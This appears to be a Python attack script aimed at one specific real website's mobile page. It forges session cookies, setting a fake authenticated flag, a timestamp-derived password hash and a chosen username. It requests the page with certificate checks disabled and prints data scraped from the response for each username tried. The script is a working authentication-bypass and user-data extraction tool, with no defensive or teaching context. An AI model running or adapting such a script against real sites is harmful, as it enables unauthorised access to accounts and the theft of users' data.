import hashlib
import random
import re
import time
import requests


def randPHPSESSID():
    ranstr = 'qwertyuioplkjhgfdsazxcvbnm1234567890'
    returnStr = ''.join(random.choice(ranstr) for _ in range(27))
    return returnStr


def md5(str):
    return hashlib.md5(bytes(str, encoding="utf8")).hexdigest()


headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
}

def nn(ppp):
    cookies = {
        "PHPSESSID": randPHPSESSID(),
        "m_password": md5(str(int(time.time()*1000000))),
        "m_fullname": "",
        "m_level": "0",
        "m_isPass": "1",
        "erdangjiade": "erdangjiade",
        "m_username": ppp
    }
    url = "http://niu.xn--tlqp0ic1d7xa353ch5igmrszjuj4d.xn--fiqs8s/mobile/hy.php"
    response = requests.get(url, headers=headers, cookies=cookies, verify=False)

    mm = re.compile('009900.*?h2').findall(response.text)[0].replace('009900;">', '').replace('</h2', '')
    if mm != "":
        print(ppp, mm)
